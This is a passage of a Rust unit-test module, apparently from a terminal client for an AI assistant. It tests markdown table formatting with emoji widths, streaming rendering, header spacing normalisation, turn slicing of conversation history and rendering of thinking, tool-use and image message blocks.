                "row {} has length {} but expected {}",
                index,
                row.len(),
                first_len
            );
        }
    }

    #[test]
    fn test_format_table_empty() {
        let result = format_table(&[]);
        assert!(result.is_empty());
    }

    #[test]
    fn test_format_table_minimum_separator_width() {
        let lines = vec![
            "| A | B |".to_string(),
            "|---|---|".to_string(),
            "| C | D |".to_string(),
        ];
        let result = format_table(&lines);
        // Separator dashes should be at least 3 wide
        assert!(result[1].contains("---"));
    }

    #[test]
    fn test_format_table_emoji_single() {
        let lines = vec![
            "| Status | Name |".to_string(),
            "|---|---|".to_string(),
            "| 🟢 Pass | Alpha |".to_string(),
            "| 🔴 Fail | Beta |".to_string(),
        ];
        let result = format_table(&lines);
        assert_eq!(result.len(), 4);

        // All rows should have the same display width
        let first_width = display_width(&result[0]);
        for (index, row) in result.iter().enumerate() {
            assert_eq!(
                display_width(row),
                first_width,
                "row {} has display width {} but expected {}",
                index,
                display_width(row),
                first_width
            );
        }
    }

    #[test]
    fn test_format_table_emoji_multiple() {
        let lines = vec![
            "| Icon | Desc |".to_string(),
            "|---|---|".to_string(),
            "| 🟢🟢🟢 | Good |".to_string(),
            "| 🔴 | Bad |".to_string(),
        ];
        let result = format_table(&lines);
        let first_width = display_width(&result[0]);
        for (index, row) in result.iter().enumerate() {
            assert_eq!(
                display_width(row),
                first_width,
                "row {} has display width {} but expected {}",
                index,
                display_width(row),
                first_width
            );
        }
    }

    #[test]
    fn test_format_table_emoji_mixed_with_ascii() {
        let lines = vec![
            "| Segment | Change | Verdict |".to_string(),
            "|---|---|---|".to_string(),
            "| Canadian Banking | -9% | 🔴 Credit losses |".to_string(),
            "| Global Wealth | +17% | 🟢 AUM growth |".to_string(),
            "| Other | Flat | No emoji here |".to_string(),
        ];
        let result = format_table(&lines);
        let first_width = display_width(&result[0]);
        for (index, row) in result.iter().enumerate() {
            assert_eq!(
                display_width(row),
                first_width,
                "row {} has display width {} but expected {}",
                index,
                display_width(row),
                first_width
            );
        }
    }

    #[test]
    fn test_raw_mode_prints_text_verbatim() {
        let mut renderer = StreamingRenderer::new(RenderMode::Raw);
        renderer.push_delta("**bold** text\n").unwrap();
        renderer.finish().unwrap();
        // Raw mode just prints text as-is; if it didn't panic, it works
    }

    #[test]
    fn test_raw_mode_table_buffering() {
        let mut renderer = StreamingRenderer::new(RenderMode::Raw);
        renderer
            .push_delta("| A | B |\n|---|---|\n| C | D |\n\nafter table\n")
            .unwrap();
        renderer.finish().unwrap();
    }

    #[test]
    fn test_raw_mode_table_at_end() {
        let mut renderer = StreamingRenderer::new(RenderMode::Raw);
        renderer
            .push_delta("| A | B |\n|---|---|\n| C | D |")
            .unwrap();
        renderer.finish().unwrap();
    }

    #[test]
    fn test_finish_trims_trailing_newlines_raw() {
        let mut renderer = StreamingRenderer::new(RenderMode::Raw);
        renderer.push_delta("hello\n\n\n").unwrap();
        renderer.finish().unwrap();
    }

    #[test]
    fn test_finish_trims_trailing_newlines_rich() {
        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
        renderer.push_delta("hello\n\n\n").unwrap();
        renderer.finish().unwrap();
    }

    #[test]
    fn test_finish_only_newlines() {
        let mut renderer = StreamingRenderer::new(RenderMode::Raw);
        renderer.started = true;
        renderer.buffer = "\n\n\n".to_string();
        renderer.finish().unwrap();
    }

    #[test]
    fn test_normalize_spacing_adds_blank_line() {
        let input = "## Title\nBody text";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "## Title\n\nBody text");
    }

    #[test]
    fn test_normalize_spacing_already_has_blank_line() {
        let input = "## Title\n\nBody text";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "## Title\n\nBody text");
    }

    #[test]
    fn test_normalize_spacing_header_at_end() {
        let input = "## Title";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "## Title");
    }

    #[test]
    fn test_normalize_spacing_inside_code_fence() {
        let input = "```\n## Not a header\ncode\n```";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "```\n## Not a header\ncode\n```");
    }

    #[test]
    fn test_normalize_spacing_multiple_levels() {
        let input = "# H1\ntext\n### H3\nmore text";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "# H1\n\ntext\n### H3\n\nmore text");
    }

    #[test]
    fn test_normalize_spacing_preserves_trailing_newline() {
        let input = "## Title\nBody\n";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "## Title\n\nBody\n");
    }

    #[test]
    fn test_normalize_spacing_no_space_after_hash_is_not_header() {
        let input = "##not a header\ntext";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "##not a header\ntext");
    }

    #[test]
    fn test_normalize_spacing_table_then_text() {
        let input = "| A | B |\n|---|---|\n| 1 | 2 |\n> blockquote";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "| A | B |\n|---|---|\n| 1 | 2 |\n\n> blockquote");
    }

    #[test]
    fn test_normalize_spacing_table_already_has_blank_line() {
        let input = "| A | B |\n|---|---|\n| 1 | 2 |\n\n> blockquote";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "| A | B |\n|---|---|\n| 1 | 2 |\n\n> blockquote");
    }

    #[test]
    fn test_normalize_spacing_table_inside_code_fence() {
        let input = "```\n| A | B |\n| 1 | 2 |\ncode\n```";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "```\n| A | B |\n| 1 | 2 |\ncode\n```");
    }

    #[test]
    fn test_normalize_spacing_table_at_end() {
        let input = "| A | B |\n|---|---|\n| 1 | 2 |";
        let output = normalize_spacing(input, false);
        assert_eq!(output, "| A | B |\n|---|---|\n| 1 | 2 |");
    }

    use crate::provider::{ContentBlock, ImageSource, Message, Role, ToolResultContent};

    fn user_prompt(text: &str) -> Message {
        Message {
            role: Role::User,
            content: vec![ContentBlock::Text {
                text: text.to_string(),
            }],
        }
    }

    fn assistant_text(text: &str) -> Message {
        Message {
            role: Role::Assistant,
            content: vec![ContentBlock::Text {
                text: text.to_string(),
            }],
        }
    }

    fn tool_result_message(tool_use_id: &str, body: &str) -> Message {
        Message {
            role: Role::User,
            content: vec![ContentBlock::ToolResult {
                tool_use_id: tool_use_id.to_string(),
                content: vec![ToolResultContent::Text {
                    text: body.to_string(),
                }],
                is_error: false,
            }],
        }
    }

    #[test]
    fn test_last_n_turns_handles_empty() {
        assert!(last_n_turns(&[], 1).is_empty());
        assert!(last_n_turns(&[], 0).is_empty());
    }

    #[test]
    fn test_last_n_turns_zero_returns_empty() {
        let messages = vec![user_prompt("hi"), assistant_text("hello")];
        assert!(last_n_turns(&messages, 0).is_empty());
    }

    #[test]
    fn test_last_n_turns_one_counts_to_last_user_prompt() {
        let messages = vec![
            user_prompt("first"),
            assistant_text("ack one"),
            user_prompt("second"),
            assistant_text("ack two"),
        ];
        let slice = last_n_turns(&messages, 1);
        assert_eq!(slice.len(), 2);
        assert!(matches!(slice[0].role, Role::User));
        // The "second" prompt is the boundary; both messages after it belong to that turn.
        assert_eq!(
            slice[0].text_content(),
            "second",
            "boundary should be the most recent user prompt"
        );
    }

    #[test]
    fn test_last_n_turns_two_returns_from_earlier_boundary() {
        let messages = vec![
            user_prompt("first"),
            assistant_text("ack one"),
            user_prompt("second"),
            assistant_text("ack two"),
        ];
        let slice = last_n_turns(&messages, 2);
        assert_eq!(slice.len(), 4, "N=2 includes both turns end-to-end");
        assert_eq!(slice[0].text_content(), "first");
    }

    #[test]
    fn test_last_n_turns_n_exceeds_available_returns_all() {
        let messages = vec![user_prompt("only"), assistant_text("ack")];
        let slice = last_n_turns(&messages, 99);
        assert_eq!(slice.len(), 2);
        assert_eq!(slice[0].text_content(), "only");
    }

    #[test]
    fn test_last_n_turns_skips_tool_result_user_messages() {
        // A User message that's purely ToolResult blocks must not count as a turn boundary;
        // otherwise N=1 would land on the tool result echo instead of the user's actual prompt.
        let messages = vec![
            user_prompt("real prompt"),
            assistant_text("calling tool"),
            tool_result_message("toolu_1", "tool output"),
            assistant_text("answer"),
        ];
        let slice = last_n_turns(&messages, 1);
        assert_eq!(slice.len(), 4, "all messages belong to the one real turn");
        assert_eq!(slice[0].text_content(), "real prompt");
    }

    #[test]
    fn test_last_n_turns_no_user_prompt_returns_empty() {
        // Assistant-only history (rare; only happens if the materialised view starts
        // mid-conversation) has no turn boundaries; N doesn't find anything.
        let messages = vec![assistant_text("orphan reply")];
        assert!(last_n_turns(&messages, 1).is_empty());
    }

    #[test]
    fn test_is_user_prompt_boundary_classification() {
        assert!(is_user_prompt_boundary(&user_prompt("hi")));
        assert!(!is_user_prompt_boundary(&assistant_text("hi")));
        assert!(!is_user_prompt_boundary(&tool_result_message("u", "out")));

        // User message with mixed blocks (rare but possible) is still a boundary: at least one
        // block is not a ToolResult.
        let mixed = Message {
            role: Role::User,
            content: vec![
                ContentBlock::ToolResult {
                    tool_use_id: "u".to_string(),
                    content: vec![],
                    is_error: false,
                },
                ContentBlock::Text {
                    text: "follow-up".to_string(),
                },
            ],
        };
        assert!(is_user_prompt_boundary(&mixed));
    }

    #[test]
    fn test_render_message_history_does_not_panic_on_all_block_kinds() {
        // We can't capture stderr/stdout easily from a unit test, so we settle for "every variant
        // flows through without panicking".
        let messages = vec![
            user_prompt("can you read the file?"),
            Message {
                role: Role::Assistant,
                content: vec![
                    ContentBlock::Thinking {
                        thinking: "I should call read_file.".to_string(),
                        opaque: None,
                    },
                    ContentBlock::RedactedThinking {
                        data: "opaque".to_string(),
                    },
                    ContentBlock::Text {
                        text: "Sure, reading now.".to_string(),
                    },
                    ContentBlock::ToolUse {
                        id: "u1".to_string(),
                        name: "read_file".to_string(),
                        input: serde_json::json!({"path": "a.txt"}),
                    },
                ],
            },
            Message {
                role: Role::User,
                content: vec![ContentBlock::ToolResult {
                    tool_use_id: "u1".to_string(),
                    content: vec![
                        ToolResultContent::Text {
                            text: "hello\n".to_string(),
                        },
                        ToolResultContent::Image {
                            source: ImageSource {
                                source_type: "base64".to_string(),
                                media_type: "image/png".to_string(),
                                data: "deadbeef".to_string(),
                            },
                        },
                    ],
                    is_error: false,
                }],
            },
            assistant_text("File starts with `hello`."),
        ];
        // Show-thinking on. If this panics, the test fails. We don't assert on captured output
        // (would need a TTY harness).
        let opts_with_thinking = HistoryRenderOptions {
            render_mode: RenderMode::Raw,
            tool_params: ToolParams::Summary,
            show_thinking: true,
            input_style: nu_ansi_term::Style::default(),
            newline_before_prompt: true,
            newline_after_prompt: true,
        };
        assert!(render_message_history(&messages, &opts_with_thinking));
        // And off: the call must still complete cleanly.
        let opts_no_thinking = HistoryRenderOptions {
            show_thinking: false,
            ..opts_with_thinking
        };
        assert!(render_message_history(&messages, &opts_no_thinking));
        // Also: no-newline-prompt config must still produce non-panicking output.
        let opts_tight = HistoryRenderOptions {
            newline_before_prompt: false,
            newline_after_prompt: false,
            ..opts_with_thinking
        };
        assert!(render_message_history(&messages, &opts_tight));
    }

    #[test]
    fn test_render_message_history_reports_when_it_showed_nothing() {
        let opts = HistoryRenderOptions {
            render_mode: RenderMode::Raw,
            tool_params: ToolParams::Summary,
            show_thinking: false,
            input_style: nu_ansi_term::Style::default(),
            newline_before_prompt: true,
            newline_after_prompt: true,
        };
        assert!(!render_message_history(&[], &opts));

        // Non-empty but invisible: tool results are deliberately not echoed and blank assistant
        // text is skipped, so this renders to nothing at all. `/history` prints its empty-state
        // line off this answer, and the caller's `[display]` blanks would otherwise bracket a
        // region with nothing in it.
        let invisible = vec![
            Message {
                role: Role::Assistant,
                content: vec![ContentBlock::Text {
                    text: "   \n".to_string(),
                }],
            },
            Message {
                role: Role::User,
                content: vec![ContentBlock::ToolResult {
                    tool_use_id: "u1".to_string(),
                    content: vec![ToolResultContent::Text {
                        text: "hello".to_string(),
                    }],
                    is_error: false,
                }],
            },
        ];
        assert!(!render_message_history(&invisible, &opts));
    }
}
